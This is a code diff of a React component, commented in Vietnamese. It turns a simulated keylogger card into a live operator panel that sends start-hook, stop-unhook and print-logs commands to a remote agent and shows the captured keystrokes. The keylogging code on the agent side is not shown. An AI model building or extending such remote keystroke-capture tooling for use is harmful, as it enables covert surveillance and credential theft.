@@ -1,103 +1,87 @@
-﻿import React, { useState, useEffect, useRef } from 'react';
-import { Keyboard, Play, Square } from 'lucide-react';
+﻿import React, { useState, useEffect } from 'react'; // Sửa đổi import
+import { Keyboard, Play, Square, RefreshCw } from 'lucide-react'; // Thêm RefreshCw
 
-// Định nghĩa kiểu dữ liệu cho một log (chỉ dùng nội bộ)
-interface KeylogEntry {
-    id: string;
-    timestamp: string;
-    key: string;
-}
+// 1. Import hook và service
+import { useSocket } from '../contexts/SocketContext';
+import { sendCommand } from '../services/socketService';
 
-/**
- * Component hiển thị card "Keylogger" (dạng giả lập)
- * SỬA LỖI: Thêm "Cuộn Thông Minh" (Smart Scrolling)
- */
+// 2. Xóa bỏ interface KeylogEntry
+
 export default function KeyloggerCard() {
     const [isLogging, setIsLogging] = useState(false);
-    const [logs, setLogs] = useState<KeylogEntry[]>([]);
+    const [logs, setLogs] = useState<string>(""); // 3. Đổi logs thành string
+    const [isLoading, setIsLoading] = useState(false); // Thêm state loading
+    const { selectedAgentId } = useSocket(); // 4. Lấy agentId từ context
 
-    // 1. Thêm ref cho div BÊN NGOÀI (div cuộn)
-    const logsContainerRef = useRef<HTMLDivElement>(null);
-    const intervalRef = useRef<NodeJS.Timeout | null>(null);
+    // 5. XÓA BỎ: logsContainerRef, intervalRef, mockKeys, keyIndex
+    
+    // 6. XÓA BỎ: useEffect cũ (phần simulation)
 
-    // Dữ liệu giả lập
-    const mockKeys = ['h', 'e', 'l', 'l', 'o', ' ', 'w', 'o', 'r', 'l', 'd', '[Enter]', 't', 'h', 'i', 's', ' ', 'i', 's', ' ', 'a', ' ', 's', 'i', 'm', 'u', 'l', 'a', 't', 'i', 'o', 'n', '.'];
-    let keyIndex = 0;
-
-    // Effect để chạy/dừng việc "gõ phím" giả lập
-    useEffect(() => {
-        if (isLogging) {
-            intervalRef.current = setInterval(() => {
-
-                // 2. Logic "cuộn thông minh"
-                const container = logsContainerRef.current;
-                let shouldScroll = false;
-                if (container) {
-                    // 2a. Kiểm tra xem user có đang ở đáy hay không (cho 20px "lệch" để an toàn)
-                    const atBottom = (container.scrollHeight - container.scrollTop - container.clientHeight) <= 20;
-                    if (atBottom) {
-                        shouldScroll = true;
-                    }
-                }
-
-                // 2b. Thêm log mới
-                const newLog: KeylogEntry = {
-                    id: Date.now().toString(),
-                    timestamp: new Date().toLocaleTimeString(),
-                    key: mockKeys[keyIndex % mockKeys.length],
-                };
-                keyIndex++;
-                setLogs((prev) => [...prev, newLog]);
-
-                // 2c. Chỉ cuộn *nếu* user đang ở đáy (để không làm phiền khi user đang cuộn lên xem)
-                if (shouldScroll && container) {
-                    // 2d. Dùng setTimeout 0ms để chờ DOM cập nhật (log mới được render) rồi mới cuộn
-                    setTimeout(() => {
-                        container.scrollTop = container.scrollHeight; // Cuộn thẳng xuống đáy
-                    }, 0);
-                }
-
-            }, 500); // Gõ 1 phím mỗi 500ms
-        } else {
-            // Dừng gõ
-            if (intervalRef.current) {
-                clearInterval(intervalRef.current);
-            }
+    // 7. VIẾT LẠI: handleStartLogging
+    const handleStartLogging = async () => {
+        if (!selectedAgentId) return alert('Vui lòng chọn một Agent trước.');
+        setIsLoading(true);
+        try {
+            // Gửi lệnh "HOOK"
+            await sendCommand(selectedAgentId, 'keylog_start_hook');
+            setIsLogging(true);
+            setLogs("Đã bắt đầu theo dõi. Bấm 'Làm mới Logs' để xem kết quả.\n");
+        } catch (err: any) {
+            alert(`Lỗi khi bắt đầu: ${err.message}`);
         }
-
-        // Dọn dẹp khi component bị unmount
-        return () => {
-            if (intervalRef.current) {
-                clearInterval(intervalRef.current);
-            }
-        };
-    }, [isLogging]); // 3. Chỉ phụ thuộc vào isLogging
-
-    // 4. XÓA BỎ useEffect cuộn tự động cũ
-    // useEffect(() => {
-    //   logsEndRef.current?.scrollIntoView({ behavior: 'smooth' });
-    // }, [logs]);
-
-    const handleStartLogging = () => {
-        setIsLogging(true);
+        setIsLoading(false);
     };
 
-    const handleStopLogging = () => {
+    // 8. VIẾT LẠI: handleStopLogging
+    const handleStopLogging = async () => {
+        if (!selectedAgentId) return alert('Vui lòng chọn một Agent trước.');
+        setIsLoading(true);
+        try {
+            // Gửi lệnh "UNHOOK"
+            await sendCommand(selectedAgentId, 'keylog_stop_unhook');
+            setIsLogging(false);
+            setLogs("Đã dừng theo dõi.");
+        } catch (err: any) {
+            alert(`Lỗi khi dừng: ${err.message}`);
+        }
+        setIsLoading(false);
+    };
+
+    // 9. THÊM MỚI: handlePrintLogs (Lấy kết quả)
+    const handlePrintLogs = async () => {
+        if (!selectedAgentId) return alert('Vui lòng chọn một Agent trước.');
+        setIsLoading(true);
+        try {
+            // Gửi lệnh "PRINT"
+            const response = await sendCommand(selectedAgentId, 'keylog_print_logs');
+            // Agent sẽ trả về payload là một chuỗi (toàn bộ log đã ghi)
+            setLogs(response.payload || "(Không có dữ liệu log)");
+        } catch (err: any) {
+            setLogs(""); // Xóa log cũ nếu có lỗi
+            alert(`Lỗi khi lấy logs: ${err.message}`);
+        }
+        setIsLoading(false);
+    };
+
+    // 10. THÊM MỚI: Tự động xóa log khi đổi Agent
+    useEffect(() => {
+        setLogs("");
         setIsLogging(false);
-    };
+    }, [selectedAgentId]);
+
 
     return (
         <div className="bg-white rounded-lg shadow-md p-6">
             <h3 className="text-lg font-bold text-gray-800 mb-4 flex items-center gap-2">
                 <Keyboard className="w-5 h-5" />
-                Keylogger (Simulation)
+                Keylogger {/* 11. Xóa chữ (Simulation) */}
             </h3>
 
             <div className="flex gap-2 mb-4">
                 {/* (Nút Start) */}
                 <button
                     onClick={handleStartLogging}
-                    disabled={isLogging}
+                    disabled={isLogging || isLoading || !selectedAgentId} // Cập nhật disable
                     className="flex-1 flex items-center justify-center gap-2 px-4 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 transition-colors disabled:bg-gray-400 disabled:cursor-not-allowed"
                 >
                     <Play className="w-4 h-4" />
@@ -106,7 +90,7 @@ export default function KeyloggerCard() {
                 {/* (Nút Stop) */}
                 <button
                     onClick={handleStopLogging}
-                    disabled={!isLogging}
+                    disabled={!isLogging || isLoading || !selectedAgentId} // Cập nhật disable
                     className="flex-1 flex items-center justify-center gap-2 px-4 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 transition-colors disabled:bg-gray-400 disabled:cursor-not-allowed"
                 >
                     <Square className="w-4 h-4" />
@@ -114,28 +98,40 @@ export default function KeyloggerCard() {
                 </button>
             </div>
 
-            {/* Màn hình terminal giả lập */}
-            {/* 5. GÁN REF cho div cuộn */}
+            {/* 12. THÊM NÚT LÀM MỚI */}
+            <div className="flex gap-2 mb-4">
+                 <button
+                    onClick={handlePrintLogs}
+                    disabled={isLoading || !selectedAgentId} // Không cần isLogging
+                    className="flex-1 flex items-center justify-center gap-2 px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors disabled:bg-gray-400 disabled:cursor-not-allowed"
+                >
+                    <RefreshCw className={`w-4 h-4 ${isLoading ? 'animate-spin' : ''}`} />
+                    Làm mới Logs (Print)
+                </button>
+            </div>
+
+            {/* Màn hình terminal */}
             <div
-                ref={logsContainerRef}
+                // 13. Xóa 'ref'
                 className="bg-gray-900 rounded-lg p-4 h-[300px] overflow-y-auto font-mono text-sm"
             >
+                {/* 14. THAY ĐỔI CÁCH HIỂN THỊ LOG */}
                 {logs.length === 0 ? (
-                    <p className="text-gray-500">Bấm "Start Logging" để xem mô phỏng...</p>
+                    <p className="text-gray-500">
+                        {!selectedAgentId ? "Vui lòng chọn một Agent." : "Bấm 'Start Logging' để bắt đầu..."}
+                    </p>
                 ) : (
-                    logs.map((log) => (
-                        <div key={log.id} className="text-green-400 mb-1">
-                            [{log.timestamp}] {log.key}
-                        </div>
-                    ))
+                    // Dùng <pre> để giữ lại các dấu xuống dòng (\n)
+                    <pre className="text-green-400 whitespace-pre-wrap">
+                        {logs}
+                    </pre>
                 )}
-                {/* 6. XÓA BỎ div logsEndRef */}
             </div>
 
             {isLogging && (
                 <div className="mt-2 text-sm text-green-600 flex items-center gap-2">
                     <span className="w-2 h-2 bg-green-600 rounded-full animate-pulse"></span>
-                    Logging active (Simulation)
+                    Logging active on Agent {/* 15. Xóa (Simulation) */}
                 </div>
             )}
         </div>
